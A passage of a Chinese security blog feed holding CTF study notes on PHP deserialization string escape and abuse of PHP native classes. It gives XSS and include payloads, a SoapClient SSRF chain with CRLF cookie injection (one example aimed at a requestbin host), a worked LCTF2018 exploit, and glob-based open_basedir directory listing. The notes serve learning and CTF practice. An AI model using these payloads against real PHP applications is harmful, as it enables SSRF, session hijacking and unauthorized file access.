&lt;h1 id=&quot;CTFD动态靶场搭建&quot;&gt;&lt;a href=&quot;#CTFD动态靶场搭建&quot; class=&quot;headerlink&quot; title=&quot;CTFD动态靶场搭建&quot;&gt;&lt;/a&gt;CTFD动态</summary>
      
    
    
    
    <category term="技术" scheme="https://mizore.site/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP反序列化字符串逃逸</title>
    <link href="https://mizore.site/article/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"/>
    <id>https://mizore.site/article/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</id>
    <published>2023-07-28T17:11:05.127Z</published>
    <updated>2024-11-24T16:52:08.669Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="PHP反序列化字符串逃逸"><a href="#PHP反序列化字符串逃逸" class="headerlink" title="PHP反序列化字符串逃逸"></a>PHP反序列化字符串逃逸</h2><p>虽然是大一就学的知识点，但是前段时间做题的时候发现又忘了。所以把他记录下来，方便下次查阅。</p><p>反序列化字符串逃逸主要出现在字符串增加或者减少的情况。</p><p><strong>前置知识：</strong></p><p>php的序列化数据中，使用<code>;</code>来分隔不同的字段，使用<code>&#125;</code>来作为结尾。并且序列化时，严格按照字段的长度来读取字符。反序列化的过程严格按照序列化规则来进行反序列化，否则会反序列化失败。</p><p>可以反序列化类中不存在的元素。</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307290109929.png" alt="image-20230728212301109"></p><p>在反序列化不存在元素时需要注意前面的成员数需要与后面的成员数相符合</p><p>字符增加&#x2F;减少函数示例</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php function b($data)&#123; return str_replace(&quot;aa&quot;,&quot;bbbb&quot;,$data);&#x2F;&#x2F;字符串增加 &#125;  function a($data)&#123; return str_replace(&quot;bbbb&quot;,&quot;aa&quot;,$data);&#x2F;&#x2F;字符串减少 &#125;</code></pre><h3 id="字符串增加"><a href="#字符串增加" class="headerlink" title="字符串增加"></a>字符串增加</h3><p>测试代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php function b($data)&#123; return str_replace(&quot;aa&quot;,&quot;bbbb&quot;,$data);&#x2F;&#x2F;字符串增加 &#125;class test&#123;public $student&#x3D;&quot;aa&quot;;public $tecacher&#x3D;&quot;other&quot;;#public $test;&#125;$a &#x3D; new test();$a&#x3D;serialize($a);#$b&#x3D;$a;echo $b&#x3D;b($a).&quot;\n&quot;;var_dump(unserialize($b));</code></pre><p>反序列化结果</p><pre class="line-numbers language-none"><code class="language-none">O:4:&quot;test&quot;:3:&#123;s:7:&quot;student&quot;;s:2:&quot;bbbb&quot;;s:8:&quot;tecacher&quot;;s:5:&quot;other&quot;;s:4:&quot;test&quot;;N;&#125;</code></pre><p>可以看到输入的aa已经被替换成了bbbb。字符串实际长度增加了，但是字符串的读取长度并没有增加。所以逃逸了的两个字符bb。</p><p>这里我们可以构造<code>;</code>来提前闭合反序列化数据，实现逃逸。</p><p><strong>所以字符串增加利用的是插入与增加字符相同长度的反序列化数据，然后再利用闭合符号来让插入数据被当做正常内容进行反序列化。</strong></p><p>比如可以把teacher改成如下数据</p><pre class="line-numbers language-none"><code class="language-none">$tecacher&#x3D;&#39;aaaa&quot;;&#125;x&#39;;</code></pre><p>成功反序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">O:4:&quot;test&quot;:2:&#123;s:7:&quot;student&quot;;s:5:&quot;other&quot;;s:8:&quot;tecacher&quot;;s:8:&quot;bbbbbbbb&quot;;&#125;x&quot;;&#125;object(test)#1 (2) &#123;  [&quot;student&quot;]&#x3D;&gt;  string(5) &quot;other&quot;  [&quot;tecacher&quot;]&#x3D;&gt;  string(8) &quot;bbbbbbbb&quot;&#125;</code></pre><p>现在把上面代码test属性注释去掉，然后通过字符串逃逸给test反序列化赋值（一共逃逸26个字符）</p><pre class="line-numbers language-none"><code class="language-none">$tecacher&#x3D;&#39;aaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:4:&quot;test&quot;;s:5:&quot;hello&quot;;&#125;&#39;</code></pre><p>成功反序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">O:4:&quot;test&quot;:3:&#123;s:7:&quot;student&quot;;s:5:&quot;other&quot;;s:8:&quot;tecacher&quot;;s:52:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;test&quot;;s:5:&quot;hello&quot;;&#125;&quot;;s:4:&quot;test&quot;;N;&#125;object(test)#1 (3) &#123;  [&quot;student&quot;]&#x3D;&gt;  string(5) &quot;other&quot;  [&quot;tecacher&quot;]&#x3D;&gt;  string(52) &quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;  [&quot;test&quot;]&#x3D;&gt;  string(5) &quot;hello&quot;&#125;</code></pre><h3 id="字符串减少"><a href="#字符串减少" class="headerlink" title="字符串减少"></a>字符串减少</h3><p>测试代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php function a($data)&#123; return str_replace(&quot;aaaa&quot;,&quot;bb&quot;,$data);&#x2F;&#x2F;字符串增加 &#125;class test&#123;public $student&#x3D;&quot;aaaaaaaa&quot;;public $tecacher&#x3D;&quot;other&quot;;#public $test;&#125;$a &#x3D; new test();$a&#x3D;serialize($a);#$b&#x3D;$a;echo $b&#x3D;a($a).&quot;\n&quot;;var_dump(unserialize($b));</code></pre><p>反序列化结果</p><pre class="line-numbers language-none"><code class="language-none">O:4:&quot;test&quot;:2:&#123;s:7:&quot;student&quot;;s:8:&quot;bbbb&quot;;s:8:&quot;tecacher&quot;;s:5:&quot;other&quot;;&#125;</code></pre><p>可以看到student字段的长度标识与其实际字段长度不符合，缺少了4个字符。所以在反序列化过程中会继续向后读取四个字符，也就是读取到<code>:</code>。当然这样的结果是导致反序列化失败。</p><p>对于字符串减少的利用在于<strong>让它把我们不需要的字符都当做字段内容读取掉，那么我们在后面构造的内容就会被当做正常内容进行反序列化，从而实现反序列化任意类</strong>。</p><p>示例如下</p><p>首先计算student字段内容后面的长度</p><pre class="line-numbers language-none"><code class="language-none">&quot;;s:8:&quot;tecacher&quot;;s:XX:&quot;&#x2F;&#x2F;共23个字符</code></pre><p>所以需要构造12组<code>aaaa</code>，并在上面的字段内容开头补上一个字符。同时利用teacher参数构造我们想反序列化的类</p><p>参数设置如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">public $student&#x3D;&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;public $tecacher&#x3D;&#39;a&quot;;s:8:&quot;tecacher&quot;;s:6:&quot;hacker&quot;;&#125;&#39;;</code></pre><p>成功反序列化</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307290109586.png" alt="image-20230728214400510"></p><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>最后提一个我自己在做题的时候遇到的小坑，关于不同类型的成员属性在反序列化后的长度变化</p><ul><li>public无标记，变量名不变，长度不变: s:2:”op”;i:2;</li><li>protected在变量名前添加标记\00*\00，长度+3: s:5:”\00*\00op”;i:2;</li><li>private在变量名前添加标记\00(classname)\00，长度+2+类名长度: s:17:”\00FileHandler_Z\00op”;i:2;</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;



&lt;h2 id=&quot;PHP反序列化字符串逃逸&quot;&gt;&lt;a href=&quot;#PHP反序列化字符串逃逸&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化字符串逃逸&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="技术" scheme="https://mizore.site/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP原生类相关利用学习</title>
    <link href="https://mizore.site/article/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>https://mizore.site/article/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-07-24T16:51:13.391Z</published>
    <updated>2024-11-24T16:52:14.071Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="PHP原生类相关利用"><a href="#PHP原生类相关利用" class="headerlink" title="PHP原生类相关利用"></a>PHP原生类相关利用</h2><p>第一次听到原生类是听一个师傅说的，没想到这么快就在做题的时候遇到了。</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>PHP原生类是PHP的一些内置的类，可以直接调用。因为其包含一些魔术方法，所以可以在反序列化的时候利用。有时候，在题目中出现了反序列化，但是没有给出具体类，一般不是源码泄露再审计，就是利用php的原生类。</p><p>常用的原生类有以下几个：</p><ul><li>Error</li><li>Exception</li><li>SoapClient</li><li>DirectoryIterator</li><li>SimpleXMLElement</li></ul><p>遍历PHP内置类的方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> &lt;?php$classes &#x3D; get_declared_classes();foreach ($classes as $class) &#123;    $methods &#x3D; get_class_methods($class);    foreach ($methods as $method) &#123;        if (in_array($method, array(            &#39;__destruct&#39;,            &#39;__toString&#39;,            &#39;__wakeup&#39;,            &#39;__call&#39;,            &#39;__callStatic&#39;,            &#39;__get&#39;,            &#39;__set&#39;,            &#39;__isset&#39;,            &#39;__unset&#39;,            &#39;__invoke&#39;,            &#39;__set_state&#39;    &#x2F;&#x2F; 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类        ))) &#123;            print $class . &#39;::&#39; . $method . &quot;\n&quot;;        &#125;    &#125;&#125; </code></pre><h3 id="Error内置类进行"><a href="#Error内置类进行" class="headerlink" title="Error内置类进行"></a>Error内置类进行</h3><p>适用条件：</p><ul><li>适用于PHP7版本</li><li>开启报错的情况下</li></ul><p>Error是php7的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 <code>__toString()</code> 的方法，这个方法将异常或者错误对象转换为字符串。</p><p>常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 <code>echo &lt;Object&gt;</code> 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如<code>echo</code>的时候）会触发<code>__toString</code> 方法，这是一种挖洞的新思路。</p><p><strong>类属性（参数）：</strong></p><ul><li>message：错误消息内容</li><li>code：错误代码</li><li>file：抛出错误的文件名</li><li>line：抛出错误在该文件中的行数</li></ul><p><strong>类方法：</strong></p><ul><li><a href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> — 初始化 error 对象</li><li><a href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> — 获取错误信息</li><li><a href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> — 返回先前的 Throwable</li><li><a href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> — 获取错误代码</li><li><a href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> — 获取错误发生时的文件</li><li><a href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> — 获取错误发生时的行号</li><li><a href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> — 获取调用栈（stack trace）</li><li><a href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> — 获取字符串形式的调用栈（stack trace）</li><li><a href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> — error 的字符串表达</li><li><a href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> — 克隆 error</li></ul><p>触发XSS示例</p><p>测试代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$a &#x3D; unserialize($_GET[&#39;whoami&#39;]);echo $a;?&gt;</code></pre><p>可以看到这个测试代码的特点是有反序列化入口但是没给反序列化的类</p><p>POC如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$a&#x3D;new Error(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;);$b&#x3D;serialize($a);echo urlencode($b);</code></pre><p>利用Error错误输出的特点，在做题中可以用来绕过如md5，sha1等的比较</p><p>例题</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">if( ($this-&gt;syc !&#x3D; $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) &#x3D;&#x3D;&#x3D; md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)&#x3D;&#x3D;&#x3D; sha1($this-&gt;lover)) )&#123;          if(!preg_match(&quot;&#x2F;\&lt;\?php|\(|\)|\&quot;|\&#39;&#x2F;&quot;, $this-&gt;syc, $match))&#123;              eval($this-&gt;syc);          &#125; else &#123;              die(&quot;Try Hard !!&quot;);          &#125;</code></pre><p>这段代码可以使用数组绕过，但是使用数组无法进行后续的RCE</p><p>测试代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php $a &#x3D; new Error(&#39;this is a test&#39;,1); echo $a;</code></pre><p>输出结果</p><pre class="line-numbers language-none"><code class="language-none">Error: this is a test in &#x2F;box&#x2F;script.php:2Stack trace:#0 &#123;main&#125;</code></pre><p>可以发现只输出了异常休息内容和塞在行数，并没有输出异常代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php $a &#x3D; new Error(&#39;this is a test&#39;,1);$b &#x3D; new Error(&#39;this is a test&#39;,2) echo $a.PHP_EOL; echo $b;</code></pre><p>输出结果</p><pre class="line-numbers language-none"><code class="language-none">Error: this is a test in &#x2F;box&#x2F;script.php:2Stack trace:#0 &#123;main&#125;Error: this is a test in &#x2F;box&#x2F;script.php:2Stack trace:#0 &#123;main&#125;</code></pre><p>可以看到两个的输出是一样的，但是输入却不同，所以可以利用这个特性来绕过判断</p><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$str &#x3D; &quot;?&gt;&lt;?&#x3D;include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;&#x2F;&#x2F;url取反绕过冒号过滤$a&#x3D;new Error($str,1);$b&#x3D;new Error($str,2);</code></pre><h3 id="Exception-内置类"><a href="#Exception-内置类" class="headerlink" title="Exception 内置类"></a>Exception 内置类</h3><p>Exception内置类和Error内置类用法基本相同，区别在于Exception内置类适用于php5&#x2F;7版本。</p><p><strong>类属性：</strong></p><ul><li>message：异常消息内容</li><li>code：异常代码</li><li>file：抛出异常的文件名</li><li>line：抛出异常在该文件中的行号</li></ul><p><strong>类方法：</strong></p><ul><li><a href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> — 异常构造函数</li><li><a href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> — 获取异常消息内容</li><li><a href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> — 返回异常链中的前一个异常</li><li><a href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> — 获取异常代码</li><li><a href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> — 创建异常时的程序文件名称</li><li><a href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> — 获取创建的异常所在文件中的行号</li><li><a href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> — 获取异常追踪信息</li><li><a href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> — 获取字符串类型的异常追踪信息</li><li><a href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> — 将异常对象转换为字符串</li><li><a href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> — 异常克隆</li></ul><h3 id="SoapClient-类"><a href="#SoapClient-类" class="headerlink" title="SoapClient 类"></a>SoapClient 类</h3><p>SoapClient类是PHP内置类中一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问web服务的PHP客户端。在做题时可用于SSRF</p><p>类方法如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">SoapClient &#123;    &#x2F;* 方法 *&#x2F;    public __construct ( string|null $wsdl , array $options &#x3D; [] )    public __call ( string $name , array $args ) : mixed    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay &#x3D; false ) : string|null    public __getCookies ( ) : array    public __getFunctions ( ) : array|null    public __getLastRequest ( ) : string|null    public __getLastRequestHeaders ( ) : string|null    public __getLastResponse ( ) : string|null    public __getLastResponseHeaders ( ) : string|null    public __getTypes ( ) : array|null    public __setCookie ( string $name , string|null $value &#x3D; null ) : void    public __setLocation ( string $location &#x3D; &quot;&quot; ) : string|null    public __setSoapHeaders ( SoapHeader|array|null $headers &#x3D; null ) : bool    public __soapCall ( string $name , array $args , array|null $options &#x3D; null , SoapHeader|array|null $inputHeaders &#x3D; null , array &amp;$outputHeaders &#x3D; null ) : mixed&#125;</code></pre><p>内置类中有一个<code>__call</code>方法，<code>__call</code>方法被触发后，它可以发送HTTP和HTTPS请求，正是这样它可以被利用到SSRF中。</p><p>构造函数如下</p><pre class="line-numbers language-none"><code class="language-none">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</code></pre><ul><li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li><li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li></ul><p>利用SoapClient进行SSRF示例</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$a &#x3D; new SoapClient(null,array(&#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;IP_ADDR:PORT&#x2F;XXX&#39;,&#39;uri&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;IP_ADDR:PORT&#39;));$b&#x3D;serialize($a);echo $b;$c&#x3D;unserialize($b);$c-&gt;a(); &#x2F;&#x2F;调用不存在的方法触发__call()进行SSRF</code></pre><p>但是，由于它仅限于HTTP&#x2F;HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。</p><p>插入cookie示例</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$target &#x3D; &#39;http:&#x2F;&#x2F;requestbin.net&#x2F;r&#x2F;doe3ps5d&#39;;$a &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target, &#39;user_agent&#39; &#x3D;&gt; &quot;WHOAMI\r\nCookie: PHPSESSID&#x3D;tcjr6nadpk3md7jbgioa6elfk4&quot;, &#39;uri&#39; &#x3D;&gt; &#39;test&#39;));$b &#x3D; serialize($a);echo $b;$c &#x3D; unserialize($b);$c-&gt;a();    &#x2F;&#x2F; 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt;</code></pre><p>例题</p><p><strong>bestphp’s revenge</strong></p><p>题目源码如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);$b &#x3D; &#39;implode&#39;;call_user_func($_GET[&#39;f&#39;], $_POST);session_start();if (isset($_GET[&#39;name&#39;])) &#123;    $_SESSION[&#39;name&#39;] &#x3D; $_GET[&#39;name&#39;];&#125;var_dump($_SESSION);$a &#x3D; array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);call_user_func($b, $a);?&gt; array(0) &#123; &#125;</code></pre><p>使用dirsearch可扫出flag.php</p><p>内容如下</p><pre class="line-numbers language-none"><code class="language-none">only localhost can get flag!session_start();echo &#39;only localhost can get flag!&#39;; $flag &#x3D; &#39;LCTF&#123;*************************&#125;&#39;; if($_SERVER[&quot;REMOTE_ADDR&quot;]&#x3D;&#x3D;&#x3D;&quot;127.0.0.1&quot;)&#123; $_SESSION[&#39;flag&#39;] &#x3D; $flag; &#125; only localhost can get flag!</code></pre><p>由<code>$_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;</code>可以推测这里需要通过内网进行访问。由此可以推断出这里需要使用SSRF。</p><p>反观源码，有两个<code>call_user_func</code>可以使用可以调用任意函数。这里能想到的就是使用SoapClient类进行SSRF。但是要使用SoapClient进行SSRF的话需要反序列化触发SoapClient类里的<code>__call()</code>魔法函数。</p><p> 问题是题目里并没有直接给出反序列化接口，但是由题目里的<code>session_start()</code>可以联想到这里要利用<code>session()</code>进行反序列化。</p><p>先利用题目中的</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">if (isset($_GET[&#39;name&#39;])) &#123;    $_SESSION[&#39;name&#39;] &#x3D; $_GET[&#39;name&#39;];&#125;</code></pre><p>写入序列化数据，再根据此处</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">var_dump($_SESSION);$a &#x3D; array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);call_user_func($b, $a);</code></pre><p>利用<code>call_user_func</code>的特性可以调用不存在的函数触发SSRF从而将flag写入session中。最后通过<code>var_dump($_SESSION);</code>输出flag。</p><p>这里第一步要先设置php的session序列化引擎</p><blockquote><p>但是如果想要利用session反序列化漏洞的话，我们必须要有 <code>ini_set()</code> 这个函数来更改 <code>session.serialize_handler</code> 的值，将session反序列化引擎修改为其他的引擎，本来应该使用ini_set()这个函数的，但是这个函数不接受数组，所以就不行了。于是我们就用<code>session_start()</code>函数来代替，即构造 session_start(serialize_handler&#x3D;php_serialize) 就行了。我们可以利用题目中的 <code>call_user_func($_GET[‘f’], $_POST);</code> 函数，传入<code>GET：/?f=session_start</code>、POST：<code>serialize_handler=php_serialize</code>，实现 session_start(serialize_handler&#x3D;php_serialize) 的调用来修改此页面的序列化引擎为php_serialize。</p></blockquote><p>先把session中的PHPSESSID记录下来</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049498.png" alt="image-20230719150003390"></p><pre class="line-numbers language-module__htmlArea" data-language="module__htmlArea"><code class="language-module__htmlArea">n4caglsikk9fufk06mefhv4gv6</code></pre><p>修改反序列化引擎，把需要反序列化的数据写入session</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a &#x3D; new SoapClient(null,array(&#39;location&#39;&#x3D;&gt;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&quot;,&#39;user_agent&#39;&#x3D;&gt;&quot;s4mmy\r\nCookie: PHPSESSID&#x3D;n4caglsikk9fufk06mefhv4gv6\r\n&quot;,&#39;uri&#39;&#x3D;&gt;&quot;123&quot;));$b&#x3D;urlencode(serialize($a));echo &#39;|&#39;.$b;</code></pre><p>这里我踩的了个小坑，像<code>\r\n</code>这种转义字符在PHP中要放在双引号中才能生效，我之前写的时候放在单引号内无法生效。。</p><pre class="line-numbers language-none"><code class="language-none">|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A53%3A%22s4mmy%0D%0ACookie%3A+PHPSESSID%3Dn4caglsikk9fufk06mefhv4gv6%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</code></pre><p>（不要忘记序列化数据区前面的竖杠）</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049671.png" alt="image-20230719150147210"></p><p>接着只要刷新页面就能反序列化数据。但是还需以一步是触发<code>__call</code>方法。这里利用的是<code>call_user_func</code>的一个特性。当传入<code>call_user_func</code>的参数是一个数组时，可以用<code>call_user_func()</code>来调用一个类里面的方法，call_user_func()会将这个数组中的第一个值当做类名，第二个值当做方法名，所以就会调用<code>welcome_to_the_lctf2018</code>这个不存在的方法完成反序列化。至于<code>$b</code>就是用<code>extarct</code>函数进行变量覆盖。</p><pre class="line-numbers language-none"><code class="language-none">?f&#x3D;extractPOSTb&#x3D;call_user_func</code></pre><p>执行完成后只要带上之前保存的Cookie去访问页面就能获得flag</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049224.png" alt="image-20230719150301629"></p><p>这里我在一开始做题时又反了毛病，就是写序列化数据在session处忘了带上了PHPSESSID</p><h3 id="DirectoryIterator-类"><a href="#DirectoryIterator-类" class="headerlink" title="DirectoryIterator 类"></a>DirectoryIterator 类</h3><p>Directorylterator类属于PHP的原生文件操作类</p><p>Directorylterator类提供了一个查看文件系统目录的简单接口，是PHP5的一个新增类。</p><p><strong>Directorylterator与glob:&#x2F;&#x2F;协议结合可以无视open_basedir对目录的限制</strong>，可以用来列举出指定目录下的文件。</p><p>测试代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&#x2F;&#x2F; test.php&lt;?php$dir &#x3D; $_GET[&#39;whoami&#39;];$a &#x3D; new DirectoryIterator($dir);foreach($a as $f)&#123;    echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#x2F;&#x2F;如果想输出全部的文件名我们还需要对$dir对象进行遍历&#125;?&gt;&lt;?php$dir &#x3D; $_GET[&#39;whoami&#39;];$a &#x3D; new DirectoryIterator($dir);foreach($a as $f)&#123;    echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#x2F;&#x2F;如果想输出全部的文件名我们还需要对$dir对象进行遍历&#125;?&gt;</code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">?whoami&#x3D;glob:&#x2F;&#x2F;&#x2F;*</code></pre><p>可以看到访问了phpstudy所在盘下根目录所有文件</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049096.png" alt="image-20230719162032861"></p><blockquote><p>但是会发现只能列根目录和open_basedir指定的目录的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。</p></blockquote><p>glob协议适用通配符查询</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049258.png" alt="image-20230719162433774"></p><p>其他文件操作类</p><p>FilesystemIterator 类<br>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p><p>该类的使用方法与DirectoryIterator 类也是基本相同的：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$dir&#x3D;new FilesystemIterator(&quot;&#x2F;&quot;);echo $dir;</code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;?php$dir&#x3D;new FilesystemIterator(&quot;&#x2F;&quot;);foreach($dir as $f)&#123;    echo($f.&#39;&lt;br&gt;&#39;);    &#x2F;&#x2F;echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#125;</code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;?php$dir&#x3D;new FilesystemIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*php*&quot;);echo $dir;</code></pre><p>GlobIterator 类</p><p>由于使用 GlobIterator 类支持直接通过模式匹配来寻找文件路径，所以我们就不用在配合glob:&#x2F;&#x2F;协议了。</p><p>测试代码：</p><pre class="line-numbers language-none"><code class="language-none">代码：&lt;?php$dir &#x3D; $_GET[&#39;whoami&#39;];$a &#x3D; new GlobIterator($dir);foreach($a as $f)&#123;    echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#x2F;&#x2F; 不加__toString()也可,因为echo可以自动调用&#125;?&gt;# payload一句话的形式:$a &#x3D; new FilesystemIterator(&quot;&#x2F;*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#125;</code></pre><h4 id="可读取文件内容类"><a href="#可读取文件内容类" class="headerlink" title="可读取文件内容类"></a>可读取文件内容类</h4><p>plFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。</p><p>该类的构造方法可以构造一个新的文件对象用于后续的读取。</p><p>我们可以像类似下面这样去读取一个文件的一行：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$context &#x3D; new SplFileObject(&#39;&#x2F;cachegrind.out.1004&#39;);echo $context;</code></pre><p>但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$context &#x3D; new SplFileObject(&#39;&#x2F;cachegrind.out.1004&#39;);foreach($context as $f)&#123;    echo($f);&#125;</code></pre><h3 id="SimpleXMLElement类"><a href="#SimpleXMLElement类" class="headerlink" title="SimpleXMLElement类"></a>SimpleXMLElement类</h3><p>SimpleXMLElement这个内置类用于解析XML文档中的元素</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">public SimpleXMLElement::__construct(    string $data,    int $options &#x3D; 0,    bool $dataIsURL &#x3D; false,    string $namespaceOrPrefix &#x3D; &quot;&quot;,    bool 